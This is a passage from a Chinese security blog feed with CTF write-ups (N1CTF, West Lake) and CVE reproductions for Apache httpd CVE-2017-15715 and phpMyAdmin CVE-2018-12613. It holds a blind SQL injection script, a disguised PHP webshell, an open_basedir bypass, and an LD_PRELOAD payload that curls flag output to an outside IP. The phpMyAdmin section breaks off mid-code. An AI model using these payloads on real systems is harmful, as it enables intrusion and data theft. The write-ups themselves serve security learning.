low:</span><br><span class="line">        payload = <span class="string">"1',updatexml(1,if(ascii(substr((select group_concat(b) from (select 1,2 as b union select * from n1key)a),&#123;&#125;,1))&gt;&#123;&#125;,1,concat(0x282b,('n1ctf'),0x292b)),1)),('1"</span>.format(</span><br><span class="line">            x, mid)</span><br><span class="line">        <span class="comment">#table:n1ip,n1key</span></span><br><span class="line">        <span class="comment">#n1ip:id,ip,time ip</span></span><br><span class="line">        <span class="comment">#n1key:id,key</span></span><br><span class="line">        <span class="comment">#2,n1ctf20205bf75ab0a30dfc0c</span></span><br><span class="line">        data = &#123;<span class="string">"X-Forwarded-For"</span>: payload&#125;</span><br><span class="line">        resp = requests.get(url, headers=data)  <span class="comment">#GET:params=data POST:data=data</span></span><br><span class="line">        print(resp.url)</span><br><span class="line">        <span class="comment"># print(resp.text)</span></span><br><span class="line">        <span class="keyword">if</span> resp.text.count(<span class="string">'noip'</span>) == <span class="number">2</span>:  <span class="comment">#</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="comment"># print(mid)</span></span><br><span class="line">    result += chr(int(mid))</span><br><span class="line">    print(result)</span><br><span class="line">    <span class="comment"># print(len(result))</span></span><br><span class="line">print(<span class="string">"end......."</span>)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>这是用无列名盲注注出的key，前面查表数据库等用union联合盲注就可以了</p><p>(赛后发现key是sql数据库的关键词，用反引号包裹就能注出数据，比赛没想到，拉跨了…)</p><img src="/2020/10/20/n1ctf2020/1.png" class=""><p>这里用无列名是因为列是存在数据的，但是带不出来</p><p>下面就是序列化数据传入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ip</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ip;</span><br><span class="line">        <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> flag();</span><br><span class="line">    $a-&gt;ip = <span class="keyword">new</span> ip();</span><br><span class="line">    $a-&gt;check = <span class="string">'n1ctf20205bf75ab0a30dfc0c'</span>;</span><br><span class="line">    $a-&gt;ip-&gt;ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">    <span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:9:"127.0.0.1";&#125;s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";&#125;（注：不用new ip类也可以，比赛时懒得改了）</span></span><br></pre></td></tr></table></figure><p>传过去就能拿到flag了</p><img src="/2020/10/20/n1ctf2020/2.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> n1ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ApacheHTTPD换行解析漏洞CVE-2017-15715</title>
      <link href="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/"/>
      <url>/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要<a id="more"></a></h2><p>Apache HTTPD<code>是一款HTTP服务器，它可以通过</code>mod_php<code>来运行</code>PHP<code>网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析</code>PHP<code>时，</code>1.php\x0a<code>将被按照</code>PHP`后缀进行解析，导致绕过一些服务器的安全策略。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>&lt;FilesMatch&gt;</code>中指定的表达式可以将’$’匹配到恶意文件名中的换行符，而不是仅匹配文件名的末尾。可以在外部阻止某些文件的上载但仅通过匹配文件名尾部的环境中利用此功能。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache httpd 2.4.0-2.4.29</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">装有docker的centos</span><br><span class="line">环境搭建</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub</span><br><span class="line">cd &#x2F;vulhub&#x2F;CVE-2018-15715</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这个<code>github</code>上拉下来的<code>index.php</code>中已经补全了上传的html代码，先来看一下重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看到上传的文件名用的不是平常看到的<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>的形式，这是因为会自动去掉换行    </p><p>下面来看一下配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> \<span class="attr">.php</span>$&gt;</span></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> /<span class="attr">var</span>/<span class="attr">www</span>/&gt;</span></span><br><span class="line">Options -Indexes</span><br><span class="line">AllowOverride All</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的以<code>php</code>为后缀的文件都会被当作<code>PHP</code>代码进行解析，问题就出在用<code>$</code>符进行了匹配，当<code>$</code>符进行正则匹配时会以换行符作为匹配结束的位置，这就造成了可以用换行符进行绕过对黑名单的检测</p><p>下面先上传一个<code>php</code>文件,burp抓包</p><p>当不作任何修改上传时</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/1.png" class=""><p>下面就是利用<code>CVE-2017-15715</code>的点，通过burp的hex功能添加换行符，图中标亮的就是修改的位置</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/2.png" class=""><p>上传成功</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/3.png" class=""><p>访问上传的shell，成功getshell</p><img src="/2020/10/14/ApacheHTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9ECVE-2017-15715/4.png" class=""><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.升级到最新版本</p><p>2.或将上传的文件重命名为为<code>时间戳+随机数+.jpg</code>的格式并禁用上传文件目录执行脚本权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>westlake</title>
      <link href="/2020/10/11/westlake/"/>
      <url>/2020/10/11/westlake/</url>
      
        <content type="html"><![CDATA[<p>比赛那天疯狂补作业~~,今天赵总搭好环境了，上车~~<a id="more"></a></p><h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>编码绕过</li><li>通配符</li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'security.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">'sandbox/'</span>.sha1($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">"index.php"</span>,<span class="string">"&lt;?php echo 'Welcome To Dbapp OSS.';?&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">"write"</span> &amp;&amp;  SecurityCheck(<span class="string">'filename'</span>,$_GET[<span class="string">'filename'</span>]) &amp;&amp;SecurityCheck(<span class="string">'content'</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">"\n Powered By Dbapp OSS."</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">"reset"</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">"index.php"</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Security Check Failed.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑不是很难，创建一个沙箱，<code>$content</code>通过post传值，<code>$action</code>的值是<code>write</code>就能写入数据到指定的<code>$filename</code>中，可以看到<code>json_encode()</code>函数，不难发现传的数据要以<code>json</code>的格式</p><p>这里本地先测试一下，代码简短如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//post流传数据</span></span><br><span class="line">$content = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"><span class="comment">//json格式解码</span></span><br><span class="line">$content = json_decode($content);</span><br><span class="line">$newcontent = $content-&gt;content;</span><br><span class="line">print_r($newcontent);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/10/11/westlake/1.png" class=""><p>可以发现成功输出了content的值，但是题目环境写入失败，猜测是对content进行了过滤，用编码绕过，开始想到的是用<code>url</code>编码，但是发现并不能被成功解析</p><img src="/2020/10/11/westlake/2.png" class=""><p>尝试别的加密方式，<code>unicode</code>可以被解析</p><img src="/2020/10/11/westlake/3.png" class=""><p>这层<code>WAF</code>绕过之后，就要看写入文件的文件名了，发现<code>php</code>后缀没有被<code>ban</code>，成功写入，可以读取</p><img src="/2020/10/11/westlake/4.png" class=""><p>下面就可以写入命令执行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"\u0063\u006f\u006e\u0074\u0065\u006e\u0074"</span>:<span class="string">"&lt;?=`ls /`;?&gt;"</span>&#125; =&gt;<span class="keyword">echo</span> `ls`</span><br></pre></td></tr></table></figure><img src="/2020/10/11/westlake/5.png" class=""><p>后面就是读取flag文件了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"\u0063\u006f\u006e\u0074\u0065\u006e\u0074"</span>:<span class="string">"&lt;?=`cat /f*`;?&gt;"</span>&#125;</span><br><span class="line">&#123;<span class="string">"\u0063\u006f\u006e\u0074\u0065\u006e\u0074"</span>:<span class="string">"&lt;?=`cat /read*`;?&gt;"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="newupload"><a href="#newupload" class="headerlink" title="newupload"></a>newupload</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>换行上传php文件</li><li>desktop.ini污染马</li><li>php-fpm</li></ul><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>上传文件，经过测试，只有<code>jpg</code>文件才能成功上传，当时比赛环境是被<code>WAF</code>检测的文件都会<code>504</code></p><p>采取<code>1.\np\nh\np\n</code>绕过，同时小马用<code>desktop.ini</code>污染</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ï¿½ï¿½</span><br><span class="line">[.ShellClassInfo]</span><br><span class="line">LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,<span class="number">-21770</span></span><br><span class="line">IconResource=%SystemRoot%\system32\imageres.dll,<span class="number">-112</span></span><br><span class="line">IconFile=%SystemRoot%\system32\shell32.dll</span><br><span class="line">IconIndex=<span class="number">-235</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">$_GET[<span class="number">0</span>]($_GET[<span class="number">1</span>]);phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看一下能不能上传成功</p><img src="/2020/10/11/westlake/6.png" class=""><p>成功上传，访问<code>/upload/1.php</code>，看一下当前目录</p><img src="/2020/10/11/westlake/7.png" class=""><p>没得到啥有用的信息，来读取一下<code>index.php</code></p><img src="/2020/10/11/westlake/8.png" class=""><p>只是一个文件上传的判断，但是<code>open_basedir</code>限制,绕过读取一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mkdir(&#39;suanve&#39;);chdir(&#39;suanve&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);</span><br><span class="line">var_dump(scandir(&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&quot;.$_GET[&#39;dir&#39;]));</span><br></pre></td></tr></table></figure><img src="/2020/10/11/westlake/9.png" class=""><p>修改上传的shell，尝试读取<code>flag</code>，发现权限不够</p><p>列<code>tmp</code>目录，可以发现<code>sock</code>文件</p><img src="/2020/10/11/westlake/10.png" class=""><p>下面的步骤来自几篇博客文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;skysec.top&#x2F;2019&#x2F;06&#x2F;10&#x2F;2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;186186#h2-7</span><br></pre></td></tr></table></figure><p>在自己的服务器上部署<code>so</code>文件，用<code>gcc</code>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"curl 123.56.22.0:6666/`/readflag`"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload是改自p神的项目，附上地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;phith0n&#x2F;9615e2420f31048f7e30f3937356cf75</span><br></pre></td></tr></table></figure><p>具体的原理可以看一下上面的两篇文章，下面就直接放复现的payload截图了</p><img src="/2020/10/11/westlake/11.png" class=""><p>通过<code>copy</code>函数，将自己服务器上编译完成的so文件复制到题目的<code>tmp</code>路径下，再访问上传的文件，同时监听<code>6666</code>端口，可以看到flag被成功带出</p><img src="/2020/10/11/westlake/12.png" class="">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpMyAdmin-4.8.1-CVE-2018-12613</title>
      <link href="/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/"/>
      <url>/2020/10/07/phpMyAdmin-4-8-1-CVE-2018-12613/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-关于phpmyadmin"><a href="#0x01-关于phpmyadmin" class="headerlink" title="0x01 关于phpmyadmin"></a>0x01 关于phpmyadmin<a id="more"></a></h2><p>phpMyAdmin 是众多 MySQL图形化管理工具中使用最为广泛的一种，是一款使用PHP 开发的基于B/S模式的 MySQL 客户端软件，该工具是基于 Web 跨平台的管理程序，并且支持简体中文，用户可以在官网上下载最新版本的。phpMyAdmin 为Web 开发人员提供了类似 Access，SQL Server 的图形化数据库操作界面，通过该管理工具可以对 MySQL 进行各种操作，如何创建数据库，数据表和生成 MySQL 数据库脚本文件等。</p><h2 id="0x02漏洞描述"><a href="#0x02漏洞描述" class="headerlink" title="0x02漏洞描述"></a>0x02漏洞描述</h2><p>攻击者可以在该漏洞中包含（查看并可能执行）服务器上的文件。</p><p>该漏洞来自代码的一部分，其中页面被重定向并在phpMyAdmin中加载，以及对白名单页面的不正确测试。</p><p>除以下情况外，必须对攻击者进行身份验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- $ cfg [&#39;AllowArbitraryServer&#39;] &#x3D; true：攻击者可以指定他&#x2F;她已控制的任何主机，并在phpMyAdmin上执行任意代码</span><br><span class="line">- $ cfg [&#39;ServerDefault&#39;] &#x3D; 0：这绕过登录并运行易受攻击的代码，而无需任何身份验证</span><br></pre></td></tr></table></figure><h2 id="0x03影响版本"><a href="#0x03影响版本" class="headerlink" title="0x03影响版本"></a>0x03影响版本</h2><p>phpMyAdmin 4.8.0和4.8.1</p><h2 id="0x04复现环境"><a href="#0x04复现环境" class="headerlink" title="0x04复现环境"></a>0x04复现环境</h2><p>phpstudy+phpmyadmin4.8.1</p><h2 id="0x05漏洞分析"><a href="#0x05漏洞分析" class="headerlink" title="0x05漏洞分析"></a>0x05漏洞分析</h2><p>该漏洞点在index.php中的55~64行的代码处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析上面的代码，这里有五个判断，只有都为真才能进入到下面的包含</p><ul><li><code>$_REQUEST[&#39;target&#39;]</code>不能为空</li><li><code>$_REQUEST[&#39;target&#39;]</code>必须为字符串</li><li><code>$_REQUEST[&#39;target&#39;]</code>不能够以index开头</li><li><code>$_REQUEST[&#39;target&#39;]</code>不能出现在<code>$target_blacklist</code>中的内容</li><li>满足<code>Core::checkPageValidity()</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>可以看到只要传入的参数不是import.php或者export.php即可</p><p>跟进一下<code>Core::checkPageValidity()</code>,路径为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\libraries\classes\Core.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">$whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;<span class="comment">//判断是否在$whitelist中</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_page = mb_substr(<span class="comment">//返回指定长度的$page的值</span></span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)<span class="comment">//拼接?,查找$page第一次出现？的位置</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">$_page = urldecode($page);<span class="comment">//url解码</span></span><br><span class="line">    <span class="comment">//再次重复上面的检测</span></span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的问题出现在解码及后面部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过url解码之后判断是否在<code>$whitelist</code>中，跟进<code>self::$goto_whitelist</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 